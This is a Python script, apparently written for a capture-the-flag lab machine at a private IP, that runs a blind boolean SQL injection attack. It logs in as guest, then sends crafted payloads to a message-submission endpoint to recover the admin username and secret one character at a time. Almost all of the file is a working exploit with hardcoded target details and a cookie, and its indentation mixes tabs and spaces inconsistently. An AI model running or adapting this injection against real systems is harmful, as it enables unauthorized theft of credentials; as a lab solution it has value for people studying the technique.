#!/usr/bin/python

import requests
import string
from termcolor import cprint
import time

d = "0123456789abcdef"
url = "http://10.10.10.195/"
username = "guest"
password = "guest"
cookie = {"auth" : "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.pphZk8uLbrCO3sAKgequRlsSNuXfvW1mWVIOAsF7QRo="}

def get_cookie(url, username, password):

    r = requests.post(url + "postlogin", data = {"username" : username, "password" : password})
    return r.cookies["auth"]

def get_admin_username(url, cookie):
    username_length = 0
    for i in range(128):
        payload = "' AND (SELECT CASE WHEN ((SELECT length(username) FROM users WHERE role=1) = "+str(i)+") THEN 1 ELSE MATCH(1,1) END))--"
        r = requests.post(url + "submitmessage", cookies = {"auth" : cookie}, data = {"message" : payload})
	if not "unable" in r.text:
            username_length = i
            break

    username = ""
    for i in range(username_length):
        for c in string.printable:
            payload = "' AND (SELECT CASE WHEN ((SELECT hex(substr(username,"+str(i+1)+",1)) FROM users WHERE role=1) = hex('"+str(c)+"')) THEN 1 ELSE MATCH(1,1) END))--"
            r = requests.post(url + "submitmessage", cookies = {"auth" : cookie}, data = {"message" : payload})
	    if not "unable" in r.text:
    
                username += c
                break

    return username

def get_admin_secret(url, cookie):
    secret_length = 64
    password = ""
    for i in range(secret_length):
    	for c in d:
    	#print c
    	    payload = "' AND (SELECT CASE WHEN ((SELECT substr(secret,"+str(i+1)+",1) FROM users WHERE role=1) = '"+c+"') THEN 1 ELSE MATCH(1,1) END))--"
       	    #print payload
       	    # print("[+] Requesting...")
            r = requests.post(url + "submitmessage",cookies={"auth" : cookie}, data={"message":payload}).text
            #print(payload)
            if not "unable" in r:
            	password += c
            	break
    return password



cookie = get_cookie(url, username, password)
print cookie

print ""
cprint("[+] Generating Payload...", "yellow", attrs=['bold'])
time.sleep(0.5)
print
cprint("[+] Requesting to the website...", "yellow", attrs = ['bold'])


print
cprint("[+]Getting Username...", "green", attrs = ['bold'])
username = get_admin_username(url, cookie)
cprint("[+] Username : " + username)

cprint("[+] Getting Password...", "green", attrs = ['bold'])
password = get_admin_secret(url, cookie)

cprint("Password for" + username + " :" +  password, "green", attrs=['bold','blink']) 

